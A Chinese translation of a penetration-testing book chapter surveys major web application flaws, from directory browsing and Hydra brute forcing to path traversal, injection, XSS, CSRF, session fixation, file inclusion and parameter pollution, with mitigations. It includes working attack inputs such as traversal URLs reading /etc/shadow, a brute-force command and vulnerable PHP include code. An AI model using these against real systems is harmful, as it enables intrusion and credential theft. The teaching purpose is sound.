# 第 4 章：Web 应用程序的主要缺陷

在[第 1 章](11.html#aid-2D7TI1 "Chapter 1. Introduction to Penetration Testing and Web Applications")*渗透测试和 Web 应用简介*中，我们讨论了 Web 应用程序的体系结构，以及演示（Web 服务器）、应用程序和数据访问这三个层如何协同工作，为最终用户提供无缝体验。用户端的浏览器在向用户显示请求的网页时也起着关键作用。任何级别的漏洞都可能使 web 应用程序不稳定，并容易受到恶意用户的攻击。

数据访问层的漏洞被认为是最严重的漏洞，因为有可能暴露存储在其中的整个数据集，其中可能包含个人信息和密码。对数据库的访问必须严格防范攻击。在应用程序层，您将发现大部分由编程错误引起的缺陷，我们将检查其中的几个缺陷，例如，服务器端脚本缺陷、输入验证缺陷、SQL 和命令注入缺陷。

web 服务器充当用户和应用程序其余部分之间的接口。这是一个关键层，需要对服务器进行适当的加固，以防止其暴露出超出应有范围的信息。

缺陷不限于服务器端；在新一代 web 应用程序中，大量代码通过 web 浏览器在用户端运行。攻击者利用此机会攻击客户端并劫持 web 浏览器。由于 web 浏览器还存储大量信息，并且可以访问客户端的底层操作系统，因此攻击者可以检索用户浏览习惯、书签和存储的密码等信息。一旦浏览器被劫持，攻击者还可以将客户端重定向到他们控制的网站，从而在用户计算机上运行恶意代码。客户端缺陷是有针对性的缺陷，利用客户端技术（如 AJAX、JSON 和 flash 代码）从客户端提取信息。

在本章中，我们将研究 web 应用程序中存在的不同缺陷以及利用这些缺陷的技术。

# 信息泄露

信息泄漏是指与应用程序和服务器相关的敏感和关键信息被暴露的缺陷。web 应用程序不应向最终用户透露任何与系统相关的信息，因为恶意用户可以了解应用程序和服务器的内部工作情况。信息泄漏是最基本的缺陷之一，很容易避免。必须严格保护敏感数据，如 web 应用程序的底层技术细节和与环境相关的信息，应用程序开发人员应避免将这些细节泄露给最终用户。

## 目录浏览

最常见的信息泄漏形式是由于目录浏览功能配置不当造成的，当未配置索引文件时，该功能会显示一个目录下的所有文件。这种错误配置可能会透露比预期多得多的信息。要做的第一件事是从本质上敏感的 web 目录中删除文件。

大多数 web 服务器管理员所做的一个错误假设是，如果他们删除了指向文件的所有链接，这些文件应该对普通用户隐藏，那么他们就无法访问这些文件。这个假设被证明是完全错误的，因为许多自动扫描器可以很容易地识别这样的目录。如果`robots.txt`文件中没有明确提及这些文件，搜索引擎也会对其进行索引。`robots.txt`文件不保证将文件从索引中排除，因为它是一种选择性加入功能，不允许链接索引。目录浏览配置与大多数 web 服务器中的目录设置一致。即使在根文件夹中放置了索引文件，其他目录也可能存在漏洞。

### 使用 DirBuster 进行目录浏览

DirBuster 是一种经常用来扫描 web 服务器目录浏览缺陷的工具。DirBuster 是在 OWASP 项目下发布的，但现在是 WebScarab 代理的附加组件。在 Kali Linux 2.0 中，您仍然可以在**应用程序****Web 应用程序分析****Web 爬虫&目录暴力破解**中找到作为独立应用程序的 DirBuster。

您需要指定要扫描的目标 URL，并为其提供一个字典文件，该文件包含 DirBuster 工具可以扫描网站的预定义目录列表。扫描输出可以以文本、CSV 和 XML 格式导出，以便进一步使用和报告，如以下屏幕截图所示：

![Directory browsing using DirBuster](../Images/image01117.jpeg)

### 提示

查看备份文件和重命名的文件，包括扫描中的`.bak`和`.old`扩展名。

### HTML 代码中的注释

信息泄漏的另一个来源是通过 web 应用程序开发人员使用的评论字段。开发人员通常在源代码中包含注释，然后忘记删除它们或清理任何敏感数据的注释。恶意攻击者可以通过这些注释了解应用程序中的函数流，甚至获取与 web 应用程序相关的敏感数据，因为一些没有经验的开发人员可能会在注释中包含数据库名称和其他基础结构详细信息。虽然您可以使用 web 浏览器查看 HTML 源代码中的注释，但 WebScarab 代理中包含的片段插件可以轻松地在整个 HTML 页面中找到注释。一旦您将 web 浏览器配置为使用 WebScarab 代理并捕获 web 流量，fragments 插件将查看这些网页上的注释和脚本，然后导航到 WebScarab 代理顶部窗格上的 fragments 选项卡即可查看这些注释和脚本。

您需要点击下拉菜单上的，然后选择评论来查看：

![Comments in HTML code](../Images/image01118.jpeg)

### 缓解措施

目录浏览是每个目录的设置，需要在每个目录上进行验证。在 Apache 中，您可以使用`.htaccess`文件覆盖单个目录设置，在 IIS web 服务器中，可以使用 IIS 管理器或`appcmd`命令设置目录权限。

# 认证问题

web 应用程序中的身份验证起着重要作用，因为它验证用户的身份，并允许用户仅查看用户有权访问的内容并与之交互。在 web 应用程序中，身份验证通常由用户名和密码组合完成。

## 认证协议及缺陷

在 web 应用程序中使用以下方法进行身份验证：

*   基本身份验证
*   摘要认证
*   集成认证
*   基于表单的身份验证

### 基本认证

在基本认证中，用户名和密码通过网络传输，使用 Base64 编码，非常容易反转和获取明文密码。如果未通过安全通道进行传输，则攻击者很容易嗅出凭据。这些缺点应该足以说服开发人员转向更安全的身份验证方法。

### 摘要认证

摘要模式认证的引入消除了基本认证的缺点。它引入了一个 nonce 值，当客户端与服务器共享身份验证凭据时，该值用作 salt。除了 nonce 值之外，还会发送密码的 MD5 哈希值，而不是 Base64 编码值。

### 集成认证

Microsoft Windows 有一个单一的登录身份验证方案，称为集成身份验证，它利用一个称为域控制器的中央身份验证服务器。一旦用户成功向域控制器进行身份验证，它将存储令牌。令牌具有定义的生命周期。当用户访问利用集成身份验证且与用户属于同一域的网站时，客户端将传递令牌，并授予用户对应用程序的访问权限。LANMAN、NTLMv1 和 NTLMv2 是用于无缝身份验证的基本质询/响应协议。

### 基于表单的身份验证

当使用登录页面在 web 表单中接受用户的用户名和密码时，称为基于表单的身份验证。在服务器端，凭证从表单中剥离，并根据身份验证系统进行验证。基于表单的身份验证引起了攻击者的极大兴趣，因为它容易受到注入攻击，因为开发人员负责实现表单的安全性。当未实现 SSL 时，身份验证信息也以明文形式共享。

使用 Burp 代理，我们可以嗅探客户端与服务器共享的身份验证凭据，如下面的屏幕截图所示。用户名和密码在 HTTP 消息正文中清晰可见：

![Form-based authentication](../Images/image01119.jpeg)

## 暴力强迫凭证

在对 web 应用程序进行评估期间，计划中应始终包括检查密码强度的测试。web 应用程序开发人员应该实施严格的密码策略，以击败暴力工具。Hydra 是 Kali Linux 中包含的一个非常可定制的暴力强制工具，它甚至提供了使用基于表单的身份验证对应用程序的凭据进行暴力强制的选项。

### Hydra–一个强力密码破解者

Hydra 已经通过多种协议进行了测试，包括 HTTP、POP3、SMB、SSHv2、RDP 等。这是一个密码猜测工具，可以尝试暴力破解密码或使用字典文件破解密码。猜测您输入正确密码的机会与字典文件的质量成正比是毫无意义的。有了良好的社会工程技能和目标知识，你就可以建立一个好的字典文件。完整命令及其参数如下所示：

```
hydra 192.168.1.8 http-form-post "/form_auth/login.php:user=^USER^&pass=^PASS^:Rejected" -L user.txt -P pass.txt -t 10 -w 30 -o hydra.txt

```

Hydra 是一款可定制工具，包括多个选项。要成功强制执行表单登录页面，我们需要以下信息：

*   **Host**: `192.168.1.8`

    主机为目标网站，如`www.testlab.org`。

*   **Method**: `http-form-post`

    攻击登录页面时的方法是 http form post，因为它使用`post`方法。

*   **URL**: `/form_auth/login.php`

    URL 是接受凭证的操作页面，此 URL 可通过使用代理或查看 HTML 页面的源来确定。

*   **Form parameters**: `user=^USER^&Pass=^PASS^`

    这些是用于获取输入的变量，可通过在 Firefox 中使用*Ctrl*+*U*查看源代码再次确定。

*   **Failure response**: `Rejected`

    这是一个重要的选择；如果设置不正确，hydra 将不知道何时破解了密码。当您键入错误的密码时，web 应用程序会将其响应（很可能是登录失败通知）回显给客户端。hydra 使用此响应来确定是否破解了密码。当它没有收到被拒绝的消息时（这意味着它可能收到了成功消息），它将停止。可以使用代理（如 Burp）查看响应。

*   **List of username**: `-L users.txt`

    通过文本文件，您可以提供 hydra 针对目标使用的用户名列表。

*   **Password dictionary**: `-P pass.txt`

    通过`–P`选项，您可以提供 hydra 使用的密码列表以及前面提供的用户名。Hydra 尝试使用每个密码和用户名组合登录。例如，如果您有 10 个用户名和 5 个密码，它将尝试登录 50 次。

*   **Threads**: `-t 10`

    使用`–t`选项，您可以指定同时登录尝试的次数。

*   **Timeout period**: `-w 30`

    通过超时时间段，您可以指定每次登录尝试的持续时间（以秒为单位）。

*   **Output file**: `-o hydra2.txt`

    您可以使用`–o`选项将输出重定向到文本文件。

以下屏幕截图显示了上述命令的输出：

![Hydra – a brute force password cracker](../Images/image01120.jpeg)

在前面的示例中，hydra 在从服务器获得成功消息之前进行了 391 次登录尝试。它还列出了正确的用户名和密码值。

# 路径遍历

当用户能够导航出 web 根文件夹时，应用程序据说容易受到路径遍历攻击。用户应仅限于 web 根目录，并且不能访问 web 根目录之上的任何内容。恶意用户会寻找指向 web 根目录外文件的直接链接，最吸引人的是操作系统根目录。通过更改引用具有不同变体的文件的变量，可以访问存储在服务器上的文件并利用路径遍历漏洞。

最基本的路径遍历攻击是使用`../`序列通过 URL 修改资源请求。表达式`../`在操作系统中用于向上移动一个目录。攻击者必须猜测他需要向上移动和移出 web 根目录的目录数，这可以通过反复试验轻松完成。如果攻击者想要向上移动三个目录，那么他或她将使用`../../../`。

大多数 web 服务器已被锁定以防止这种攻击，但有些服务器仍然可以通过 Unicode 编码技术接受值。不仅 web 服务器容易受到路径遍历攻击；如果应用程序未执行正确的输入验证，恶意用户可能会将系统文件的绝对路径编码为 web 表单，并直接在浏览器中查看。

您可以通过在 URL 中编码`../`来检查 web 服务器是否容易受到遍历攻击，如下所示：

`http://testlab.org/..%255c..%255c..%255cboot.ini`

您可以利用路径遍历漏洞进行的一些攻击如以下示例所示：

*   `http://testlab.com/../../../../etc/shadow`

    在前面的示例中，攻击能够查看存储密码和过期详细信息的卷影文件的内容。

*   `http://testlab.com/../Windows/System32/cmd.exe?/c+dir+c:/`

    在前面的示例中，攻击者能够调用 cmd 实用程序并运行`dir c:\`命令。

*   `http://testlab.com/scripts/foo.cgi?page=../scripts/test.cgi%00txt`

    在本例中，应用程序公开了`test.cgi`文件的源代码。`%00`序列用于将文件作为普通文本文件读取。

## 使用 Burp 代理攻击路径遍历

OWASPMutillidae，一个免费、易受攻击的 web 应用程序，易受常见安全漏洞的攻击，并且在文本文件查看器组件中存在路径遍历漏洞。该应用程序可从[下载并安装 http://sourceforge.net/projects/mutillidae/](http://sourceforge.net/projects/mutillidae/) 。

另一个选项是下载由 OWASP 断开的 web 应用程序项目发布的预构建虚拟机。此虚拟机包括 Mutillidae 和许多其他易受攻击的应用程序，您可以在实验室环境中攻击这些应用程序并调整您的技能。确保实验室机器未连接到 Internet。OWASP 断开 web 应用程序项目的虚拟机文件可从[下载 http://sourceforge.net/projects/owaspbwa](http://sourceforge.net/projects/owaspbwa) 。

使用 Burp 代理，我们可以操作从浏览器传输到应用程序的数据，并测试漏洞。虚拟机启动并运行后，打开 Mutillidae 应用程序并导航到**OWASP top 10****A4 不安全的直接对象引用****文本文件查看器**。接下来，将 web 浏览器配置为使用 Burp 代理。完成后，从下拉列表中选择一个文件并单击**查看文件**。Burp 截获的请求表明该文件是在 HTTP 消息体中被请求的。现在，我们知道了在 web 根目录之外查看文件的价值。如下面的屏幕截图所示，对文件的请求是在正文中发送的，而不是 URL。即使 web 服务器没有漏洞，也可以测试应用程序的遍历缺陷：

![Attacking path traversal using Burp proxy](../Images/image01121.jpeg)

再次浏览上述步骤，当 Burp 截获来自浏览器的请求时，将分配给文本文件的值编辑为`../../../../etc/passwd`：

![Attacking path traversal using Burp proxy](../Images/image01122.jpeg)

一旦请求完成，web 浏览器将显示文件`passwd`。应用程序无法进行正确的输入验证，从而导致关键文件的暴露：

![Attacking path traversal using Burp proxy](../Images/image01123.jpeg)

如果应用程序易受路径遍历攻击，经验丰富的攻击者可以导航文件系统并获取源代码文件。

### 缓解措施

对从浏览器接收到的数据进行适当的输入验证和清理，可以防止路径遍历攻击。应用程序的开发人员在进行文件系统调用时，在接受用户输入时应该小心；如果可能，避免它。Chroot-jail 是一种很好的缓解技术，但很难实现。Web 应用程序防火墙也可以阻止此类攻击，但它应该与其他缓解技术一起使用。

# 基于注入的缺陷

当恶意用户能够修改发送给操作系统、数据库或任何解释器的查询或命令时，就会发生注入。SQL 注入和命令注入攻击是最常见的攻击。这两个缺陷都是由于输入验证不佳而存在的，应用程序和 web 服务器都无法在服务器上执行用户输入的所有恶意数据之前将其删除。

## 命令注入

有时，web 应用程序可能需要底层操作系统的帮助来完成某些任务。例如，应用程序可能希望将保存在服务器上的文件的内容显示回用户，而 web 应用程序可能调用 shell 来检索文件的内容。这可能会减少应用程序的开发时间，因为开发人员不必编写单独的函数。如果用户输入未正确验证，则可能成为命令注入缺陷的候选。

在易受命令注入漏洞攻击的应用程序中，攻击者可能会尝试在用户输入的同时插入 shell 命令，希望服务器能够运行这些命令。然后，shell 命令将以与 web 服务器相同的权限运行。易受攻击的应用程序可能会也可能不会向攻击者显示命令的输出。如果它不显示输出，则称为盲命令注入，攻击者将不得不使用其他技术来确定命令是否确实运行或只是误报。恶意黑客和白帽黑客经常使用的一个技巧是在目标应用程序的易受攻击字段中使用 shell 命令调用反向 TCP 连接，然后等待从 web 服务器到您的计算机的连接启动。

与大多数 web 应用程序缺陷一样，找到命令注入缺陷的成功与否在很大程度上取决于攻击者的技能以及他们在输入字段中使用不同命令的想象力。

如以下屏幕截图所示，在一个易受攻击的应用程序中，使用`&&`注入了一个额外的命令，并显示了文件夹中所有文件的列表以及 DNS 名称的实际解析：

![Command injection](../Images/image01124.jpeg)

### 提示

CVE-2014-6271 是 2014 年 9 月披露的一个命令注入漏洞，更被称为 shellshock bug。

## SQL 注入

没有后端数据库的 web 应用程序是不完整的。当与最终用户交互时，应用程序必须根据用户的请求从数据库中提取数据。与数据库交互的最常用方法是使用 SQL。编写糟糕的 web 应用程序将通过将 SQL 语句与用户输入相结合来构建 SQL 语句。如果未仔细验证用户输入，攻击者可以通过用户输入输入 SQL 语句，然后将其传递到后端数据库进行处理。

为了利用 SQL 注入漏洞，我们需要首先识别应用程序中的输入字段。应用程序的输入不限于用户输入信息的表单字段。攻击者可以编辑 cookie、标头或 XML 请求，将恶意数据提交回服务器；如果应用程序使用此数据构建 SQL 查询，则可以欺骗数据库以显示其他用户的数据。每个变量或字段都需要测试，以查看应用程序是否以不同的方式运行。

### 注

SQL 注入漏洞导致了一些最大的网络攻击和数据盗窃。

来自服务器的响应将帮助您识别数据库类型。作为攻击者，我们对服务器遇到恶意输入时发出的错误消息感兴趣。错误信息帮助我们得出两个结论；它揭示了数据库类型，并指出应用程序可能容易受到 SQL 注入缺陷的攻击。

以下屏幕截图显示了来自 Microsoft SQL 数据库的错误消息示例：

![SQL injection](../Images/image01125.jpeg)

下面的屏幕截图显示了来自 MySQL 数据库的错误消息示例：

![SQL injection](../Images/image01126.jpeg)

错误消息不能保证服务器易受 SQL 注入缺陷的攻击，但作为攻击者，它会使您的生活更轻松。手动发现缺陷的方法是使用代理（如 Burp、Paros 或 ZAP）并在各个字段中注入数据。TamperData 和 SQLInjectMe 是两个众所周知的 Firefox 扩展，在测试表单中的输入字段是否存在 SQL 注入缺陷时非常有用。

专用攻击者会对以更详细的方式查询数据库感兴趣。他们可能想要识别表和列的名称以窃取敏感数据。元数据表存储有关用户定义的表和列的信息。如果攻击者成功查询元数据表，他们可以使用获得的信息从存储可能包含实际敏感客户端信息的用户定义表中提取信息。SQL 注入攻击不限于从数据库中提取信息；它还可用于在底层操作系统上写入数据和执行命令注入。

下图显示了 SQL 注入缺陷的说明：

![SQL injection](../Images/image01127.jpeg)

我已经将整个[第 5 章](15.html#aid-352RK2 "Chapter 5. Attacking the Server Using Injection-based Flaws")中的*使用基于注入的缺陷攻击服务器*专门用于注入缺陷，我们将讨论用于利用这些缺陷的工具，并介绍用于攻击这些缺陷的整个方法。本章仅为您提供注入缺陷的概述。

# 跨站点脚本

跨站点脚本攻击暴露了一个漏洞，该漏洞允许攻击者在目标网站上存储恶意脚本，或诱使受害者将脚本提交到显示给客户端的目标网站。脚本通常是用 JavaScript 编写的。这里需要注意的一点是，尽管脚本可以存储在目标网站中，但它不会在该网站上运行。该脚本在用户的浏览器上运行，能够执行用户可以在目标网站上执行的所有操作。由于此攻击的目的是在客户端上运行恶意脚本，因此称为客户端攻击。

一个易受攻击的网站如果不能进行正确的输入验证，就会对这种恶意活动伸出援助之手。您是否希望用户使用 JavaScript 作为任何字段的输入？如果 web 应用程序的开发人员在将数据存储在网站上或将数据反射回浏览器之前过滤掉所有元字符，则可以击败跨站点脚本攻击。

XSS 漏洞的攻击潜力不仅限于攻击同一网站或从浏览器窃取信息；攻击者还可以使用它来攻击其他网站。下面是一个跨站点脚本攻击的示例：

![Cross-site scripting](../Images/image01128.jpeg)

确定网页是否容易受到 XSS 攻击的一种简单方法是在表单的输入字段中使用以下无害脚本。如果显示对话框，则 web 应用程序不会过滤元字符，并且容易受到 XSS 攻击：

```
<script>alert("Vulnerable to XSS!!");</script>
```

以下屏幕截图显示了 XSS 漏洞的示例：

![Cross-site scripting](../Images/image01129.jpeg)

web 应用程序未能执行正确的输入验证，并将整个脚本传递回浏览器，对话框弹出。

### 注

有些人认为跨站点脚本和 CSS 是一样的；这是不正确的，因为首字母缩写 CSS 用于级联样式表。

XSS 漏洞通常以两种形式出现：

*   **Persistent or stored XSS flaws**: In the persistent XSS vulnerability, the attacker tricks the vulnerable website to store the input containing the script. At a later time, when a user views that input, the script are sent to the browser and executes without any filtering.

    在线购物网站的论坛和评论部分通常是存储 XSS 攻击的目标。

*   **非持久性或反射的 XSS 漏洞**：反射的 XSS 漏洞会使用钓鱼电子邮件将指向易受攻击网站的链接发送给受害者。该链接的格式使恶意脚本看起来像 URL 的一部分。当受害者单击 URL 时，脚本会反射回浏览器并在客户端执行。

## 跨站点脚本攻击的攻击潜力

以下是 XSS 攻击的多种方式：

*   窃取用户密码和 cookie
*   扫描其他网站和服务器
*   在用户不知情的情况下，让浏览器参与易受攻击服务器上的事务
*   将用户重定向到其他网站
*   从受害者的电脑上窃取文件

我们将在[第 6 章](16.html#aid-37UDA1 "Chapter 6. Exploiting Clients Using XSS and CSRF Flaws")中进一步讨论 XSS，*利用客户机使用 XSS 和 CSRF 缺陷*，我们将深入探讨 XSS 缺陷，并了解使用 Kali Linux 中的工具识别它们的各种方法。

# 跨站点请求伪造

XSS 攻击欺骗浏览器运行脚本，并代表无辜受害者执行不必要的操作；**跨站点请求伪造攻击**（**CSRF**）是一种类似的缺陷，攻击者让无辜受害者执行某些操作，但不使用脚本。恶意操作的目标是当前对受害者进行身份验证的 web 应用程序。

虽然 CSRF 和 XSS 看起来很相似，但有一些明显的区别。在 CSRF 漏洞中，攻击者接管受害者的身份并代表他们执行操作。CSRF 攻击通常用于更改易受攻击网站上用户的详细信息，如电子邮件地址、电话号码和地址。

### 注

跨站点请求伪造攻击也称为单击攻击或会话骑乘攻击。

下面是一个简单的例子：

1.  Attacker identifies a direct link on a vulnerable bank application to transfer money as follows:

    `http://vulnerablebank.com/transfer.do?acct=ROGER&amount=100`

2.  无辜的受害者在`vulnerablebank.com`网站上有一个账户，目前已通过认证。
3.  The attacker tricks the victim into opening the modified URL, changing some variables using a phishing attack or storing the link on a blog or a forum.

    修改后的 URL 将 100 从当前登录用户的帐户传输到攻击者帐户，如下所示：

    `http://vulnerablebank.com/transfer.do?acct=ATTACKER_ACCOUNT&amount=100`

4.  `vulnereablebank.com`web 应用程序不会验证用户是否确实想要执行所需的事务。请求完成，攻击者的帐户增加 100。

web 应用程序再次成为 CSRF 缺陷的罪魁祸首，因为它盲目地接受来自经过身份验证的浏览器的新请求。在任何关键交易期间，如余额转移或个人详细信息更改，web 应用程序应提示用户重新输入凭据或至少实施验证码。使用随机令牌（称为反 CSRF 令牌，在每次请求时都会发生变化，这也是一个很好的缓解步骤，因为攻击者不会知道这种动态变化的随机令牌。

# 基于会话的缺陷

会话令牌是 web 应用整体认证方案中的一种重要机制。一旦用户成功地对 web 应用程序进行身份验证，就会为该用户分配一个令牌。它通常是一个长的随机数。该令牌随后由用户在与 web 应用程序的后续交互中共享，并用于重新身份验证目的。现在，令牌表示用户的身份。会话令牌还用于跟踪用户行为。这一机制有其内在的问题；如果恶意攻击者能够确定受害者的会话令牌，则攻击者可以冒充受害者。

会话令牌成为重要的信息，需要像登录凭据一样小心地加以保护，因为它与用户凭据具有相同的用途。

## 盗取代币的不同方式

盗取代币的各种方式如下：

*   强制使用可预测的会话令牌
*   在电线上嗅到令牌
*   使用客户端攻击（XSS 或恶意 JavaScript）破坏会话令牌
*   中间人攻击

### 暴力强迫代币

一些 web 应用程序仍然使用可预测的会话令牌，这些令牌非常容易猜测或使用暴力。这些令牌由一系列有限的数字或以递增顺序生成。即使应用程序以增量顺序发布令牌，您也可能会发现缺口，因为访问应用程序的其他用户也会被分配令牌。生成令牌的其他方法包括使用客户机数据，如用户名和 IP 地址，然后对其进行编码以隐藏它以防新手攻击者。在收集了大量令牌之后，可以对它们进行分析，并识别模式以打破它。

### 嗅探代币和中间人攻击

这两种偷代币的方式非常相似。在这里，攻击者嗅探服务器和客户端之间的通信。然后从嗅探数据中提取令牌。嗅探可以通过**中间人攻击**（**MITM**或通过电线嗅探来完成。知道令牌的攻击者开始模拟无辜用户访问应用程序。

### 使用 XSS 攻击窃取会话令牌

一旦用户进行身份验证，一个会话令牌被传递到 web 浏览器。相同的会话令牌随后用于会话期间与 web 应用程序的未来交互，并保存在浏览器中。如果该应用程序易受跨站点脚本漏洞的攻击，恶意攻击者可能会诱使用户运行令牌窃取脚本，从而将令牌发送到由攻击者控制的远程服务器。

### 提示

通常，您会在标头的 cookie 字段中找到传递的会话令牌。

### 应用程序和浏览器之间的会话令牌共享

中有多种方式在应用程序和 web 浏览器之间传递会话令牌：

*   在 URL 中传递会话令牌
*   使用隐藏表单字段
*   使用标头中的 set cookie 字段

## 分析代币的工具

Kali Linux 中包含的 Zed 攻击代理、Burp 代理和 WebScarab、具有收集和分析令牌的内置功能。WebScarab 具有分析和绘制图形上的值的功能。这使得可视化应用程序在定义的时间内使用的会话令牌的随机性和分布非常容易。

Burp 套件还包含一个名为 sequencer 的会话令牌分析器。sequencer 功能灵活，允许测试人员手动识别令牌。除此之外，它还允许加载脱机保存以供分析的令牌文件。它根据 FIPS 设定的标准测试令牌的随机性。对于每个通过或失败的测试，也提供了详细的解释。

## 会话固定攻击

会话固定是一种缺陷，恶意攻击者甚至在用户登录应用程序之前就将预定会话 ID 固定到用户上。攻击者从网站获取合法会话令牌，并欺骗用户在登录应用程序时使用该特定会话 ID。由于攻击者已经知道会话 ID，他们也可以劫持用户的会话。

下面是一个简单的例子：

1.  攻击者访问该网站并获得会话 ID。
2.  然后，攻击者创建一个 URL，其中包含分配给它的会话 ID，并通过论坛平台的钓鱼电子邮件诱使用户使用该 URL。
3.  受害者现在已连接到应用程序，并尝试使用预设会话令牌登录。
4.  受害者已成功登录，但未分配新的会话令牌，因为攻击者已修复了该令牌的有效 ID。因此，这种攻击称为会话固定。
5.  用户登录到应用程序后，攻击者可以使用相同的会话令牌接管会话并模拟用户。

下图说明了会话固定攻击：

![Session fixation attack](../Images/image01130.jpeg)

## 会话固定的缓解措施

如果会话令牌是 URL 的一部分，那么攻击就变得非常容易，因为创建一个自定义 URL 来引诱受害者并不重要。如果会话令牌通过 cookie 传递，则攻击变得更加困难。在另一个用户的浏览器上设置 cookie 很困难，除非应用程序本身容易受到跨站点脚本等缺陷的攻击，攻击者可以通过该漏洞在用户的浏览器中设置 cookie。另一个缓解步骤是将应用程序设计为拒绝任何用户提供的会话 ID。服务器负责创建随机会话 ID，任何用户提供的 ID 都应该被丢弃。要正确管理会话令牌，请使用经过测试的框架，如 PHP 和.NET，它们具有发送和处理会话令牌的内置机制。另一个缓解步骤是实现并发控制。

# 文件包含漏洞

在 web 应用程序中，开发人员可以包括存储在远程服务器上的代码，或者来自存储在本地服务器上的文件的代码。引用 web 根目录中的文件以外的其他文件主要用于将公共代码合并到主应用程序稍后可以引用的文件中。

## 远程文件包括

远程文件包含，或众所周知的 RFI 是一种攻击技术，当程序员不小心并在没有正确验证的情况下动态引用用户输入的外部代码时，利用文件包含机制。这可能导致应用程序被欺骗，在攻击者的控制下从远程服务器运行脚本。PHP 最容易受到远程文件包含漏洞的攻击，但该漏洞并不限于 PHP。

PHP 语言中的`include`函数允许程序员从远程服务器引用代码。下面的 PHP 代码将从 HTTP 请求中提取脚本参数的值；恶意用户可以通过拦截从浏览器到 web 服务器的 http 请求中的数据来编辑脚本变量。在普通的 web 应用程序中，当用户与 web 应用程序交互，并且应用程序以用户提供的数据或通过单击网页上的某个链接的形式请求输入时，将填充变量。

然后提取脚本变量的值并将其传递给 include 函数，该函数获取文件并将其所有内容作为 PHP 代码动态地包含到程序中，如下所示：

`http://vul_website.com/preview.php?script=http://example.com/temp`

PHP 代码如下所示：

```
$inputfile = $_REQUEST["script"];
include($inputfile.".php");
```

## 本地文件包括

在本地文件包含漏洞中，服务器的本地文件未经适当验证就被包含功能访问。许多人将本地文件包含缺陷与目录遍历缺陷混淆。尽管本地文件包含缺陷通常表现出与目录遍历缺陷相同的特征，但应用程序对这两个缺陷的处理方式不同。在目录遍历缺陷中，应用程序将只读取文件的内容并显示它。在本地文件包含缺陷中，应用程序不显示内容，而是将文件作为可执行脚本包含，并以与 web 应用程序相同的权限执行。

尽管以下 URL 看起来完全相同，但它们可能代表完全不同的攻击：

*   `http://testdemo.org/mydata/info.php?file=../../../temp/shell.php`
*   `http://testdemo.org/mydata/info.php?file=../../../temp/shell.php`

如果第一个 URL 利用路径遍历问题，`shell.php`内容将显示为文本。如果第二个 URL 利用本地文件包含，`shell.php`内容将作为 PHP 代码处理并执行。

以下是易受本地文件包含攻击的代码片段：

```
<?php
  $file = $_GET['file'];
  {
    include("pages/$file");
  }
```

## 缓解文件包含攻击

在设计层面，应用程序应尽量减少会影响应用程序流程的用户输入。如果应用程序依赖用户输入来包含文件，则只允许用户传递一个有限数量的字符，应用程序可以转换并映射到要包含的特定文件。应进行代码审查，以查找包含文件的函数，并应进行检查，以分析是否进行了适当的输入验证，以净化从用户接收的数据。

使用 LFI 的酷攻击是日志中毒。当您发出无效请求时，它会被记录到服务器上。如果它是 Apache web 服务器，则会登录到`error.log`文件中。看到服务器记录所有产生错误的内容，您就可以影响`error.log`文件的内容。作为 LFI 漏洞的一部分，我们可以在 PHP 代码中注入一些无效数据，这些数据会产生错误，但也会登录到`error.log`文件中。现在，攻击者可以通过执行以下类似操作来执行`error.log`文件中的 PHP 代码：

```
http://vulnerable.com/include.php?file=../../../../var/log/apache2/error.log
```

# HTTP 参数污染

HTTP 允许在`GET`和`POST`方法中使用相同名称的多个参数。HTTP 标准既没有解释也没有设置规则，说明如何解释具有相同名称的多个输入参数，是接受变量的最后一次出现还是第一次出现，还是将其用作数组。

在下面的示例中，`POST`请求符合标准。唯一的区别是`item_id`变量的值为`num1`和`num2`：

```
item_id=num1&item_id=num2
```

虽然根据 HTTP 协议标准是可以接受的，但不同的 web 服务器和开发框架处理多个参数的方式不同。处理多个参数的未知过程通常会导致安全问题。这种意外行为称为 HTTP 参数污染。以下屏幕截图显示了此行为：

![HTTP parameter pollution](../Images/image01131.jpeg)

下表显示了主要 web 应用程序框架/web 服务器及其对重复参数的响应：

<colgroup><col> <col> <col></colgroup> 
| 

框架/Web 服务器

 | 

结果行动

 | 

实例

 |
| --- | --- | --- |
| ASP.net/IIS | 所有引用都用逗号连接 | `item_id=num1,num2` |
| PHP/Apache | 最后发生 | `item_id=num2` |
| JSP/Tomcat | 第一次发生 | `item_id=num1` |
| IBM HTTP 服务器 | 第一次发生 | `item_id=num1` |
| python | 组合在列表（数组）中的所有引用 | `item_id=['num1','num2']` |
| Perl/Apache | 第一次发生 | `item_id=num1` |

下面是一个易受 HTTP 参数污染影响的银行应用程序示例：

1.  假设在线购物网站购物车的 URL 如下：

    ```
    https://www.vulnerablesite.com/cart.php.
    ```

2.  当用户输入特定项目的凭证代码时，应用程序的客户端代码计算折扣金额和最终金额：

    ```
    discount_amount=500&final_amount=2500
    ```

3.  在线购物应用程序向后端发出以下`POST`请求进行处理。`item_id`的值取自购物车中的项目，应用程序移动到结帐页面：

    ```
    https://www. vulnerablesite.com/cart.php
    item_id=111&discount_amount=500&final_amount=2500
    ```

4.  根据上一页中的表，PHP 只接受最后一个参数，以防重复。假设有人将`POST`请求更改如下：

    ```
    discount_amount=500&final_amount=2500&item_id=222
    ```

5.  由于用户无法控制`item_id`变量，恶意用户添加了一个具有相同名称的额外变量，并为其分配了想要折扣的项目的值。
6.  If the `cart.php` page is vulnerable to an HTTP parameter pollution, it may make the following request to the backend application:

    ```
    item_id=111&discount_amount=500&final_amount=2500&item_id=222
    ```

    以下屏幕截图显示了预览：

    ![HTTP parameter pollution](../Images/image01132.jpeg)

7.  恶意用户最后注入的副本`item_id`将覆盖请求，并尝试在`222`项上获得`500`折扣，而不是在`111`项上应用折扣。当折扣仅适用于特定商品时，此攻击在在线购物网站中可能很有用。
8.  当应用程序最后一次出现该参数时，如前一点所示，可以更改一些硬编码的参数值，否则最终用户无法编辑这些参数值。

## 缓解措施

如前面的部分所示，应用程序无法执行正确的输入验证，从而覆盖硬编码值。应在应用程序逻辑中包含白名单预期参数及其值，并针对用户输入进行消毒。Web 应用程序防火墙已经过调整，以了解可跟踪变量多次出现的缺陷，应用于处理过滤。

# HTTP 响应拆分

响应拆分可以被描述为一个漏洞，攻击者可以利用该漏洞将数据注入 HTTP 响应头。通过在标头中注入数据，攻击者可以欺骗用户的浏览器执行恶意活动。此攻击不会直接攻击服务器，而是用于利用客户端进行攻击。

例如，web 应用程序通过`GET`方法从用户获取输入，然后根据用户发送的值将用户重定向到新网页。典型的场景是用户选择一个区域，应用程序将用户重定向到为该区域定制的网页。

当用户被重定向到新页面时，以下 PHP 代码将在响应中设置`Location`字段：

```
<?php
